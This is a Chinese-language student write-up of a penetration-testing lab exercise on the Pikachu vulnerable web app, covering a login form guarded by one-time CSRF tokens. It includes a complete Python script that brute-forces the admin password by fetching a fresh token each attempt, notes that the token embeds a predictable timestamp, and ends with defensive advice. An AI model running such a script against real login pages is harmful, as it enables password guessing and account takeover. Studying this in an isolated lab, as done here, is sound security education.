---
title: 网络渗透测试作业：Pikachu 靶场（四）token 防护与脚本爆破
date: 2026-11-24 21:10:00
categories:
  - 学习笔记
tags:
  - 网络安全
  - 网络渗透测试
  - 暴力破解
---

前三关做下来，我对暴力破解的套路基本固定了：抓一条请求，丢进 Intruder，挂上字典等结果。第四关我也是这么干的，结果同一条请求发第二次，页面直接甩回来一句 `csrf token error`。

这一关跟前三关有一点不一样：前几关的防护都是「做了，但没做对」，这一关是真做对了。所以它绕不过去，只能换个思路，照着正常用户的流程走一遍，只是走得快一点。

实验还是在自己的虚拟机内网里完成，没有碰公网或者别人的站点。

<!-- more -->

## 一、实验环境

| 角色 | 用的东西 | 说明 |
|---|---|---|
| 靶机 | VMware 里的 Windows 10 + phpStudy + Pikachu 源码 | 跑着带漏洞的网站 |
| 攻击机 | Kali Linux + Burp Suite 社区版 | 抓包、重放 |
| 脚本环境 | Kali 自带的 Python 3 + requests 库 | 每轮重新领票再提交 |
| 网络 | VMware NAT，两台机器能互相访问 | 和公网隔开 |
| 本关页面 | 暴力破解 → token 防爆破 | 表单里多一个隐藏的 token 字段 |

环境跟前几关一样，只是多了个脚本。`requests` 在 kali 里一般自带，没有的话 `pip3 install requests` 装一下就行。

## 二、先弄明白几个东西

### 2.1 请求里多出来的那个参数

进页面随便输一次账号密码，在 Burp 里看这条 POST 的请求体：

```text
username=admin&password=12345&token=431686b058246977ee002152395&submit=Login
```

比上一关多了一个 `token`，一长串数字和字母混在一起，一眼看不出规律。

![抓到的这条请求：请求体里多了 username、password、token、submit 四个参数](/img/pikachu-04-request.png)

刷新几次页面，这个值每次都不同，说明它是页面加载时临时生成、再写进表单的，不是写死的东西。

那它写在哪？按 F12 打开开发者工具，在 Elements 里搜一下 `token`，能找到这么一行：

```html
<input type="hidden" name="token" value="431686b058246977ee002152395" />
```

是个隐藏字段。服务器把票塞在这里，浏览器提交表单时一并带回去，服务器比对一致才往下走。

### 2.2 它和验证码其实是同一件事

上一关的验证码，本质也是这样：服务器发一张票，提交时带回来，对得上才放行。区别只在于验证码要求人把图上的字认出来，token 不需要人认，所以直接以明文放在页面里。

所以这一关的防护思路没有变，变的是这张票能不能重复用。上一关的票能刷到实验结束，这一关的票刷第二次就作废。

## 三、实验步骤

### 3.1 先按老办法把请求送进 Repeater

先把请求 Send to Repeater，密码故意填个错的 `12345`，token 用页面上当前这张。发出去，返回 `username or password is not exists`。这句话说明了两件事：票是有效的，服务器真的去查了账号密码，只是我密码不对。

### 3.2 同一张票再发一次

接下来是关键的一步：一个字都不改，再点一次 Send。

![第一次：返回密码错误，说明票已经过了校验](/img/pikachu-04-first-send.png)

![第二次：同一个 token 原样再发，直接 csrf token error](/img/pikachu-04-second-send.png)

第一次返回密码错误，第二次直接 `csrf token error`。

这一组对比把这一关的性质定下来了：票能用，但只能用一次。也就是说 token 的「一次性」是真实现了的，不是写个字段摆在那里。想拿一条抓好的请求反复重发，这条路在这一关就断了，而 Burp 的 Intruder 恰好就是这个思路。

### 3.3 换一张新票，密码输对

为了确认票本身没问题，我又刷新页面拿了一张新票，密码换成 `123456`：

![换新票、密码正确，返回 login success](/img/pikachu-04-login-success.png)

`login success`。说明校验逻辑没毛病：票是新的、密码对了，就能进。

到这里结论很清楚，这个机制本身没有逻辑漏洞，绕不过去。那就换个方向，不绕了，按它的规矩来。

### 3.4 用脚本模拟「每轮重新领票」

正常用户的动作是这样的：打开页面领一张票，填账号密码提交，看结果，然后再打开页面领下一张票。这个过程完全合法，服务器没理由拒绝，问题只在于人手速太慢，一次只能试一个密码。

用程序把这个循环跑一遍就行：

```python
r1 = sess.get(URL)                     # 打开页面，领一张新票
token = 从 r1 里抠出 token              # 抄下来
r2 = sess.post(URL, data={... token})  # 拿这张票提交一次
```

关键在 `sess.get` 和 `sess.post` 用的是同一个 Session 对象。它自动管理 Cookie，让这两次请求被服务器认成同一个人。如果不用 Session，GET 和 POST 各算一个新访客，领到的票跟提交时的会话对不上，必然失败。

这也解释了为什么 Burp 做不了这件事：Intruder 发出去的是一条事先写死的报文，Payload 只能替换字段的值，没办法「发请求之前先去另一个请求里取个值回来」。Burp 里干这个的功能叫 session handling rules，是付费版才有的。

完整脚本：

```python
import re
import os
import requests

URL = "http://192.168.150.130/pikachu/vul/burteforce/bf_token.php"
TOKEN_RE = re.compile(r'name="token"\s+value="([^"]+)"')

sess = requests.Session()

with open(os.path.expanduser("~/pass.txt"), encoding="utf-8") as f:
    pwds = [line.strip() for line in f if line.strip()]

print("[*] target  : %s" % URL)
print("[*] username: admin")
print("[*] wordlist: ~/pass.txt (%d entries)" % len(pwds))
print("-" * 60)

hit = None
for i, pwd in enumerate(pwds, 1):
    r1 = sess.get(URL, timeout=10)              # 领票
    token = TOKEN_RE.search(r1.text).group(1)
    r2 = sess.post(URL, data={                  # 拿票提交
        "username": "admin",
        "password": pwd,
        "token": token,
        "submit": "Login",
    }, timeout=10)
    if "login success" in r2.text:
        hit = pwd
        print("[%02d/%02d] %-12s >>> login success  token=%s" % (i, len(pwds), pwd, token[:12]))
        break
    print("[%02d/%02d] %-12s wrong password   token=%s" % (i, len(pwds), pwd, token[:12]))

print("-" * 60)
if hit:
    print("[+] password: %s" % hit)
else:
    print("[!] no match in wordlist")
```

脚本里的注释和输出我全用英文写的。不是偷懒，是因为从 Windows 的编辑器粘到 kali 时，中文会因为编码不一致变成乱码，直接报语法错误。

## 四、结果与分析

### 4.1 把正确答案剔掉，看完整的 19 轮

第一次跑，没几轮就命中了 `123456`，循环立刻 break。结果是有了，但过程没看到，怎么证明每轮真的换了新票？所以我把 `123456` 从字典里删掉，让它完整跑一遍：

```bash
cp ~/pass.txt ~/pass.bak
grep -vx 123456 ~/pass.bak > ~/pass.txt
python3 ~/bf_token.py
cp ~/pass.bak ~/pass.txt
```

![19 轮跑完，每行打印的 token 都不一样](/img/pikachu-04-19-rounds.png)

19 条全是 `wrong password`，但每行 `token=` 后面那串都不一样，最后一行 `no match in wordlist` 也是正常的，因为正确答案被我删掉了。

这张输出同时说明了两个问题：同一张票复用会失败，token 机制确实有效；但每轮重新领一张票就能接着试下去，一次性 token 挡住的只是「重放」，挡不住「重新来过」。

### 4.2 token 里混了时间戳

把这 19 个 token 并排看，会发现一个很奇怪的地方：前 6 位每次都不一样，后面 6 位**全是 `b058a3`**。

19 次采样撞上同一段，这不可能是巧合。当时我怀疑里面掺了时间，就在 kali 里试了一下：

```bash
printf '%x\n' $(date +%s)
```

![当前时间的十六进制表示](/img/pikachu-04-hex-timestamp.png)

输出是 `6b058b46`，和 token 中间那段的开头 `b058` 完全一样，只是后面几位往前推了一点。两次操作前后隔了几分钟，十六进制也就走了几位，对得上。

基本可以确定，token 的中间一段是当前 Unix 时间戳的十六进制，不是纯随机数。整个 token 大概是「几位随机数字 + 时间戳的十六进制 + 几位随机字符」拼出来的。

这意味着 token 是可推算的：知道了拼接规则，连页面都不用打开，自己按时间算一个就能用。我在脚本里没有走这条路，领票更省事也更稳，但这件事本身挺值得记一笔。

### 4.3 这一关真正的问题在哪

token 解决了「重放」，没解决「频率」。脚本每轮老老实实领票、老老实实提交，从头到尾没做任何违规的事，服务器拿它没办法。

所以这一关真正的漏洞不在 token 上，而在登录接口本身：没有频率限制，也没有失败次数锁定。跑 20 次和跑 20000 次，对服务器来说是同一件事。

## 五、如果我是开发，怎么防

- **一次性 token 继续保留。** 这个设计是对的，但它只是基础，挡得住重放，挡不住脚本。
- **加频率限制。** 同一 IP 或同一账号，每分钟最多试几次，超了就延迟响应，或者要求二次验证。
- **加失败锁定。** 连续失败 5 次锁 15 分钟，同时通知用户，别让人慢慢试。
- **token 用密码学安全的随机源生成。** 比如 PHP 里的 `random_bytes()`，别用 `rand()` 拼时间戳。

## 六、小结

这一关花时间最多的地方不是写脚本，而是接受「这一关绕不过去」这件事。前三关我一直在找「哪里没做对」，第四关找不到了，只能换个方向，照着正常流程走一遍，只是走得快。

四关连起来看，其实就是一条防护演进的路：没有防护 → 加验证码 → 验证码被绕过 → 加一次性 token → token 挡不住脚本。每一层都在补上一层的洞，同时露出自己的新洞。

做完印象最深的一点是，加一个参数、加一张图这种「表面上的防护」，最后都会被自动化打败，因为参数和图都是程序能生成的。真正难绕的是限制频率和提高成本。

暴力破解这一块就先做到这里。
